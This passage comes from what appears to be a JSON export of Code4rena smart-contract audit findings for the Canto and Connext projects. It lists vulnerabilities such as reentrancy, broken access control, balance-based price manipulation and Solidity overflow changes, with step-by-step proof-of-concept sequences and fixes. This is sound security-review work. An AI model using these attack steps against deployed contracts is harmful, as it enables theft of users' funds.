balances in the contract. Also, any fees that are in the contract are used as part of the price computation but they should not.\r 3. It uses the balance instead of the `reserve` data. For many Uniswap-like AMMs, the balance can be manipulated by sending tokens directly to the contract, and then reclaimed later through a `skim`. The reserve should be used instead.\r \r #### POC\r - Attacker sends a large amount of base tokens to a Uniswap V2 pool.\r - The `getPriceFromDex` computes the `token` price as `baseBalance` denominated in `token` / `tokenBalance`. As the `baseBalance` is increased, the `tokenPrice` is increased as well.\r - Attacker calls `skim` on the pool to get back their balance.\r \r ## Recommended Mitigation Steps\r The price from DEX function is not suited for any on-chain queries.\r For off-chain queries it can also be manipulated as it uses `balance` instead of reserves - which can be claimed back at a future block although this comes with risk.\r \r "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Double Initialize on Diamond Init\r \r # Lines of code\r \r https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/upgrade-initializers/DiamondInit.sol#L36\r \r \r # Vulnerability details\r \r ## Impact\r An attacker could Double Initialize the Diamond Init contract due to unsafe checks.\r \r ## Proof of Concept\r 1. Clone the Contest Repo.\r 2. Start Remixd and go to Remix website and connect with local host\r 3. Open DiamondInit contract.\r 4. Compile it and call the init function multiple times with different arguments and accounts.\r \r ## Tools Used\r Remixd and Remix\r \r ## Root Cause \r There is no Standard Initializer modifier on init function. It seems the contract sets the `s.initalized = true` but this cannot be a valid check because I was able to call it multiple times on testing.\r \r ## Recommended Mitigation Steps\r Use Initializer modifier on Openzepplin library.\r \r "}, {"title": "CNote updates the accounts after sending the funds, allowing for reentrancy", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/311", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/CNote.sol#L70-L87   # Vulnerability details  Having no reentrancy control and updating the records after external interactions allows for funds draining by reentrancy.  Setting the severity to medium as this is conditional to transfer flow control introduction on future upgrades, but the impact is up to the full loss of the available funds by unrestricted borrowing.  ## Proof of Concept  CNote runs doTransferOut before borrowing accounts are updated:  https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/CNote.sol#L70-L87  ```         /*          * We invoke doTransferOut for the borrower and the borrowAmount.          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.          *  On success, the cToken borrowAmount less of cash.          *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.          */         doTransferOut(borrower, borrowAmount);         require(getCashPrior() == 0,\"CNote::borrowFresh: Error in doTransferOut, impossible Liquidity in LendingMarket\");     //Amount minted by Accountant is always flashed from account          /* We write the previously calculated values into storage */         accountBorrows[borrower].principal = accountBorrowsNew;         accountBorrows[borrower].interestIndex = borrowIndex;         totalBorrows = totalBorrowsNew;          /* We emit a Borrow event */         emit Borrow(borrower, borrowAmount, accountBorrowsNew, totalBorrowsNew);     } ```  Call sequence here is borrow() -> borrowInternal() -> borrowFresh() -> doTransferOut(), which transfers the token to an external recipient:  https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/CErc20.sol#L189-L200  ```     /**      * @dev Similar to EIP20 transfer, except it handles a False success from `transfer` and returns an explanatory      *      error code rather than reverting. If caller has not called checked protocol's balance, this may revert due to      *      insufficient cash held in this contract. If caller has checked protocol's balance prior to this call, and verified      *      it is >= amount, this should not revert in normal conditions.      *      *      Note: This wrapper safely handles non-standard ERC-20 tokens that do not return a value.      *            See here: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca      */     function doTransferOut(address payable to, uint amount) virtual override internal {         EIP20NonStandardInterface token = EIP20NonStandardInterface(underlying);         token.transfer(to, amount); ```  There an attacker can call exitMarket() that have no reentrancy control to remove the account of the debt:  https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/Comptroller.sol#L167-L174  https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/ComptrollerG7.sol#L157-L164  ```     /**      * @notice Removes asset from sender's account liquidity calculation      * @dev Sender must not have an outstanding borrow balance in the asset,      *  or be providing necessary collateral for an outstanding borrow.      * @param cTokenAddress The address of the asset to be removed      * @return Whether or not the account successfully exited the market      */     function exitMarket(address cTokenAddress) override external returns (uint) { ```  This attack was carried out several times:  https://certik.medium.com/fei-protocol-incident-analysis-8527440696cc   ## Recommended Mitigation Steps  Consider moving accounting update before funds were sent out, for example as it is done in CToken's borrowFresh():  ``` https://github.com/Plex-Engineer/lending-market/blob/2d423c7c3f62d65182d802deb99cc7bba4e057fd/contracts/CToken.sol#L595-L609          /*          * We write the previously calculated values into storage.          *  Note: Avoid token reentrancy attacks by writing increased borrow before external transfer.         `*/         accountBorrows[borrower].principal = accountBorrowsNew;         accountBorrows[borrower].interestIndex = borrowIndex;         totalBorrows = totalBorrowsNew;          /*          * We invoke doTransferOut for the borrower and the borrowAmount.          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.          *  On success, the cToken borrowAmount less of cash.          *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.          */         doTransferOut(borrower, borrowAmount); ```  "}, {"title": "Only the `state()` of the latest proposal can be checked", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Governance/GovernorBravoDelegate.sol#L115   # Vulnerability details  ## Impact  `state()` function cannot view the state from any proposal except for the latest one.  ## Proof of Concept  ```solidity require(proposalCount >= proposalId && proposalId > initialProposalId, \"GovernorBravo::state: invalid proposal id\"); ```  Currently `proposalCount` needs to be bigger or equal to `proposalId`.  Assuming `proposalId` is incremented linearly in conjunction with `proposalCount`, this implies only the most recent `proposalId` will pass the `require()` check above. All other proposals will not be able to have their states checked via this function.   ## Tools Used Manual Review.  ## Recommended Mitigation Steps  Change above function to `proposalCount <= proposalId` (assuming `proposalId` is set linearly, which currently is not enforced by code).   "}, {"title": "Transferring any amount of the underlying token to the CNote contract will make the contract functions unusable", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/227", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L43 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L114 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L198 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L310   # Vulnerability details  ## Impact  The contract expects the balance of the underlying token to == 0 at all points when calling the contract functions by requiring getCashPrior() == 0, which checks token.balanceOf(address(this)) where token is the underlying asset.  An attacker can transfer any amount of the underlying asset directly to the contract and make all of the functions requiring getCashPrior() == 0 to revert.   ## Proof of Concept [CNote.sol#L43](https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L43) [CNote.sol#L114](https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L114) [CNote.sol#198](https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L198) [CNote.sol#310](https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L310)  1. Attacker gets any balance of Note (amount = 1 token) 2. Attacker transfers the token to CNote which uses Note as an underlying asset, by calling note.transfer(CNoteAddress, amount). The function is available since Note inherits from ERC20 3. Any calls to CNote functions now revert due to getCashPrior() not being equal to 0  ## Recommended Mitigation Steps Instead of checking the underlying token balance via balanceOf(address(this)) the contract could hold an internal balance of the token, mitigating the impact of tokens being forcefully transferred to the contract.  "}, {"title": "WETH.allowance() returns wrong result.", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/218", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/WETH.sol#L104   # Vulnerability details  ## Impact WETH.allowance() returns wrong result. I can't find other contracts that use this function but WETH.sol is a base contract and it should be fixed properly.   ## Proof of Concept In this function, the \"return\" keyword is missing and it will always output 0 in this case.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps L104 should be changed like below. ``` return _allowance[owner][spender]; ```  "}, {"title": "In Cnote.sol, anyone can initially become both accountant and admin", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/195", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/CNote.sol#L14   # Vulnerability details  ## Impact  Affected code:  - [https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/CNote.sol#L14](https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/CNote.sol#L14)  The function `_setAccountantContract()` is supposed to be called after contract initialization, so that the `accountant` is immediately set. However, this function completely lacks any access control (it\u2019s just `public`) so an attacker can monitor the mempool and frontrun the transaction in order to become both `accountant` and `admin`  ## Tools Used  Editor  ## Recommended Mitigation Steps  The function should:  1. have a guard that regulates access control 2. not set the `admin` too, which is dangerous and out of scope  "}, {"title": "WETH.sol computes the wrong totalSupply() ", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/191", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/WETH.sol#L47   # Vulnerability details  ## Impact  Affected code:  - [https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/WETH.sol#L47](https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/WETH.sol#L47)  `WETH.sol` is almost copied from the infamous WETH contract that lives in mainnet. This contract is supposed to receive the native currency of the blockchain (for example ETH) and wrap it into a tokenized, ERC-20 form. This contract computes the `totalSupply()` using the balance of the contract itself stored in the `balanceOf` mapping, when instead it should be using the native `balance` function. This way, `totalSupply()` always returns zero as the `WETH` contract itself has no way of calling `deposit` to itself and increase its own balance  ## Proof of Concept  1. Alice transfers 100 ETH to `WETH.sol` 2. Alice calls `balanceOf()` for her address and it returns 100 WETH 3. Alice calls `totalSupply()`, expecting to see 100 WETH, but it returns 0  ## Tools Used  Editor  ## Recommended Mitigation Steps  ```jsx function totalSupply() public view returns (uint) {     return address(this).balance } ```  "}, {"title": "`lending-market/Note.sol` Wrong implementation of access control", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/173", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/b93e2867a64b420ce6ce317f01c7834a7b6b17ca/contracts/Note.sol#L13-L31   # Vulnerability details  ```solidity function _mint_to_Accountant(address accountantDelegator) external {     if (accountant == address(0)) {         _setAccountantAddress(msg.sender);     }     require(msg.sender == accountant, \"Note::_mint_to_Accountant: \");     _mint(msg.sender, type(uint).max); }  function RetAccountant() public view returns(address) {     return accountant; }  function _setAccountantAddress(address accountant_) internal {     if(accountant != address(0)) {         require(msg.sender == admin, \"Note::_setAccountantAddress: Only admin may call this function\");     }     accountant = accountant_;     admin = accountant; } ```  `_mint_to_Accountant()` calls `_setAccountantAddress()` when `accountant == address(0)`, which will always be the case when `_mint_to_Accountant()` is called for the first time.  And `_setAccountantAddress()` only checks if `msg.sender == admin` when `accountant != address(0)` which will always be `false`, therefore the access control is not working.  L17 will then check if `msg.sender == accountant`, now it will always be the case, because at L29, `accountant` was set to `msg.sender`.  "}, {"title": "`zeroswap/UniswapV2Library.sol` Wrong init code hash in `UniswapV2Library.pairFor()` will break `UniswapV2Oracle`, `UniswapV2Router02`, `SushiRoll`", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/164", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/zeroswap/blob/03507a80322112f4f3c723fc68bed0f138702836/contracts/uniswapv2/libraries/UniswapV2Library.sol#L20-L28   # Vulnerability details  ```solidity function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {     (address token0, address token1) = sortTokens(tokenA, tokenB);     pair = address(uint(keccak256(abi.encodePacked(             hex'ff',             factory,             keccak256(abi.encodePacked(token0, token1)),             hex'e18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303' // init code hash         )))); } ```  The `init code hash` in `UniswapV2Library.pairFor()` should be updated since the code of `UniswapV2Pair` has been changed. Otherwise, the `pair` address calculated will be wrong, most likely non-existing address.  There are many other functions and other contracts across the codebase, including  `UniswapV2Oracle`, `UniswapV2Router02`, and `SushiRoll`, that rely on the `UniswapV2Library.pairFor()` function for the address of the pair, with the `UniswapV2Library.pairFor()` returning a wrong and non-existing address, these functions and contracts will malfunction.  ### Recommendation  Update the init code hash from `hex'e18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303'` to the value of `UniswapV2Factory.pairCodeHash()`.  "}, {"title": "`stableswap/BaseV1Pair.sol#_update()` will revert when `reserve0CumulativeLast` or `reserve1CumulativeLast` gets large enough", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/stableswap/blob/0dd7ac65d923bb7462c47f6d56b564af34b34118/contracts/BaseV1-core.sol#L154-L171   # Vulnerability details  ```solidity function _update(uint balance0, uint balance1, uint _reserve0, uint _reserve1) internal {     uint blockTimestamp = block.timestamp;     uint timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired     if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {         reserve0CumulativeLast += _reserve0 * timeElapsed;         reserve1CumulativeLast += _reserve1 * timeElapsed;     }      Observation memory _point = lastObservation();     timeElapsed = blockTimestamp - _point.timestamp; // compare the last observation with current timestamp, if greater than 30 minutes, record a new event     if (timeElapsed > periodSize) {         observations.push(Observation(blockTimestamp, reserve0CumulativeLast, reserve1CumulativeLast));     }     reserve0 = balance0;     reserve1 = balance1;     blockTimestampLast = blockTimestamp;     emit Sync(reserve0, reserve1); } ```  This was forked from Uniswap v2's `update()`:  https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L72-L81  ```solidity=L72 // update reserves and, on the first call per block, price accumulators function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {     require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');     uint32 blockTimestamp = uint32(block.timestamp % 2**32);     uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired     if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {         // * never overflows, and + overflow is desired         price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;         price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;     } ```  UniswapV2's Pair is using Solidity 0.5.16, in which the arithmetic operations will overflow/underflow without revert.  As the solidity version used in the current implementation of `BaseV1Pair.sol` is `0.8.11`, and there are some breaking changes in Solidity v0.8.0, including:  > Arithmetic operations revert on underflow and overflow.   Ref: https://docs.soliditylang.org/en/v0.8.11/080-breaking-changes.html#silent-changes-of-the-semantics  When updating `reserve0CumulativeLast` and `reserve1CumulativeLast` in `BaseV1Pair.sol`, overflow and underflow are desired as per the comment.  However, the intended overflow only works for solidity < `0.8.0` by default. If overflow and underflow are desired, then the math should be put into an `unchecked` block. Otherwise, the transaction will revert.  ### Impact  Since the overflow is desired in the original version, and it's broken because of using Solidity version >0.8. The `BaseV1Pair` contract will break when the desired overflow happens, which will be sooner or later depending on the decimals of the tokens and trading volume.  ### Recommendation  Change to:  ```solidity unchecked {     uint timeElapsed = blockTimestamp - blockTimestampLast;     if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {         reserve0CumulativeLast += _reserve0 * timeElapsed;         reserve1CumulativeLast += _reserve1 * timeElapsed;     } } ```  "}, {"title": "Unchecked transfers", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/126", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1380 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L87 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L89 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L52 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L56 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CErc20.sol#L128 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CEther.sol#L150 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L52 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L56   # Vulnerability details  ## Impact Multiple calls to transfer are frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of \u201cfalse\u201d is returned. It\u2019s important to check this, users or admin could gain or lose tokens if return value of transfer() is not checked.  The following functions are affected: Comptroller.grantCompInternal() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1380 AccountantDelegate.sweepInterest() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L87 AccountantDelegate.sweepInterest() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L89 TreasuryDelegate.sendFund() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L52 TreasuryDelegate.sendFund() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L56 CErc20.sweepToken() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CErc20.sol#L128 CEther.doTransferOut() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CEther.sol#L150 TreasuryDelegate.sendFund() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L52 TreasuryDelegate.sendFund() - https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegate.sol#L56  ## Tools Used Slither and manual review  ## Recommended Mitigation Steps Check the returned values of transfers or use a SafeERC20 transfer.  "}, {"title": "Note: When _initialSupply ! = 0, the _mint_to_Accountant function will fail", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/125", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/Note.sol#L13-L19   # Vulnerability details  ## Impact In Note contract, if _initialSupply ! = 0, _totalSupply will overflow when the _mint_to_Accountant function executes _mint(msg.sender, type(uint).max) ```     constructor(string memory name_, string memory symbol_, uint256 totalSupply_) public {         _name = name_;         _symbol = symbol_;      _initialSupply = totalSupply_;      _totalSupply = totalSupply_;     } ...     function _mint(address account, uint256 amount) internal   {         require(account != address(0), \"ERC20: mint to the zero address\");          _beforeTokenTransfer(address(0), account, amount);          _totalSupply += amount;         _balances[account] += amount;         emit Transfer(address(0), account, amount);          _afterTokenTransfer(address(0), account, amount);     } ``` ## Proof of Concept https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/Note.sol#L13-L19 https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/ERC20.sol#L29-L34 https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/ERC20.sol#L237-L247 ## Tools Used None ## Recommended Mitigation Steps ERC20.sol ```     constructor(string memory name_, string memory symbol_) public {         _name = name_;         _symbol = symbol_;     } ``` note.sol ```     constructor() ERC20(\"Note\", \"NOTE\") {         admin = msg.sender;     } ```  "}, {"title": "Missing zero address check can set treasury to zero address", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/121", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L15-L20   # Vulnerability details  ## Impact AccountantDelegate.initialize() is missing a zero address check for `treasury_` parameter, which could may allow treasury to be mistakenly set to 0 address.  ## Proof of Concept https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegate.sol#L20  ## Tools Used Manual review  ## Recommended Mitigation Steps Add a require() check for zero address for the treasury parameter before changing the treasury address in the initialize function.  "}, {"title": "accountant address can be set to zero by anyone leading to loss of funds/tokens", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/117", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L14-L21 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L31 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L96 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L178 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L258   # Vulnerability details  ## Impact In CNote._setAccountantContract() , the require() check only works when `address(_accountant) != address(0)` , leading to the ability to set `_accountant` state variable to the zero address, as well as setting admin to zero address.  The following below are impacts arising from above: ## A. Users can gain underlying asset tokens for free by minting CToken in `mintFresh()` then calling `redeemFresh()`  ## Proof of Concept 1. Alice calls `_setAccountantContract()` with parameter input as 0. 2. The _accountant state variable is now 0. 3. Alice/or a contract calls `mintFresh()` with input address 0 and mintAmount 1000. (assuming function is external, reporting a separate issue on the mutability) 4. This passes the `if (minter == address(_accountant))` and proceeds to mint 1000 CTokens to address(0) 5. Alice then calls `redeemFresh()` with her address as the `redeemer` parameter, and redeemTokensIn as 1000. 6. Assume exchangeRate is 1, Alice would receive 1000 tokens in underlying asset.    ## B. Users could borrow CToken asset for free A user can borrow CToken asset from the contract, then set _accountant to 0 after. With _accountant being set to 0 , the borrower , then call `repayBorrowFresh()` to have _accountant (address 0) to repay back the borrowed tokens assuming address(0) already has some tokens, and user's borrowed asset (all/part) are repaid.  ## Proof of Concept 1. Alice calls `borrowFresh()` to borrow 500 CTokens from contract. 2. Then Alice calls `_setAccountantContract()` with parameter input as 0. 2. The _accountant state variable is now 0. 3. With _accountant being set to 0, Alice calls `repayBorrowFresh()` having the payer be address 0, borrower being her address and 500 as repayAmount. 4. Assume address 0 already holds 1000 CTokens, Alice's debt will be fully repaid and she'll gain 500 CTokens for free.   ## C. Accounting contract could loses funds/tokens When the _accountant is set to 0, CTokens/CNote will be sent to the zero address making the Accounting contract lose funds whenever  `doTransferOut` is called.    ## Tools Used Manual review  ## Recommended Mitigation Steps Instead of a `if (address(_accountant) != address(0))` statement, an additional require check to ensure `accountant_` parameter is not 0 address can be used in addition to the require check for caller is admin.  Change this  ```if (address(_accountant) != address(0)){             require(msg.sender == admin, \"CNote::_setAccountantContract:Only admin may call this function\");         } ```  to this ``` require(msg.sender == admin, \"CNote::_setAccountantContract:Only admin may call this function\"); require(accountant_ != address(0), \"accoutant can't be zero address\"); ```  "}, {"title": "Incorrect amount taken", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/CNote.sol#L129   # Vulnerability details  ## Impact It was observed that in repayBorrowFresh function, User is asked to send repayAmount instead of repayAmountFinal. This can lead to loss of user funds as user might be paying extra  ## Proof of Concept 1. User is making a repayment which eventually calls repayBorrowFresh function  2. Assuming repayAmount == type(uint).max, so repayAmountFinal becomes accountBorrowsPrev  3. This means User should only transfer in accountBorrowsPrev instead of repayAmount but that is not true. Contract is transferring repayAmount instead of repayAmountFinal as seen at CNote.sol#L129  ``` uint actualRepayAmount = doTransferIn(payer, repayAmount); ```  ## Recommended Mitigation Steps Revise CNote.sol#L129 to below:  ``` uint actualRepayAmount = doTransferIn(payer, repayAmountFinal); ```  "}, {"title": " AccountantDelegate: sweepInterest function will destroy the cnote in the contract.", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/89", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/Accountant/AccountantDelegate.sol#L74-L92   # Vulnerability details  ## Impact When the user borrows note tokens, the AccountantDelegate contract provides note tokens and gets cnote tokens. Later, when the user repays the note tokens, the cnote tokens are destroyed and the note tokens are transferred to the AccountantDelegate contract. However, in the sweepInterest function of the AccountantDelegate contract, all cnote tokens in the contract will be transferred to address 0. This will prevent the user from repaying the note tokens, and the sweepInterest function will not calculate the interest correctly later. ## Proof of Concept https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/Accountant/AccountantDelegate.sol#L74-L92 https://github.com/Plex-Engineer/lending-market/blob/ab31a612be354e252d72faead63d86b844172761/contracts/CToken.sol#L533 ## Tools Used None ## Recommended Mitigation Steps ```     function sweepInterest() external override returns(uint) {      uint noteBalance = note.balanceOf(address(this));   uint CNoteBalance = cnote.balanceOf(address(this));    Exp memory expRate = Exp({mantissa: cnote.exchangeRateStored()}); // obtain exchange Rate from cNote Lending Market as a mantissa (scaled by 1e18)   uint cNoteConverted = mul_ScalarTruncate(expRate, CNoteBalance); //calculate truncate(cNoteBalance* mantissa{expRate})   uint noteDifferential = sub_(note.totalSupply(), noteBalance); //cannot underflow, subtraction first to prevent against overflow, subtraction as integers    require(cNoteConverted >= noteDifferential, \"Note Loaned to LendingMarket must increase in value\");      uint amtToSweep = sub_(cNoteConverted, noteDifferential);    note.transfer(treasury, amtToSweep);  -  cnote.transfer(address(0), CNoteBalance);    return 0;     } ```  "}, {"title": "AccountantDelegator and TreasuryDelegator: abi.decode(data, (uint)) does not check the data length", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegator.sol#L44-L56   # Vulnerability details  ## Impact In AccountantDelegator and TreasuryDelegator contracts, when using abi.decode(data, (uint)) to convert data to uint type, the length of data is not checked, when the returned data is of bytes type, the abi.decode will return 0x20. ## Proof of Concept https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Treasury/TreasuryDelegator.sol#L44-L56 https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Accountant/AccountantDelegator.sol#L54-L74 This contract can test that when the function returns bytes data, abi.encode will decode the return value as 0x20. ``` pragma solidity 0.8.10; 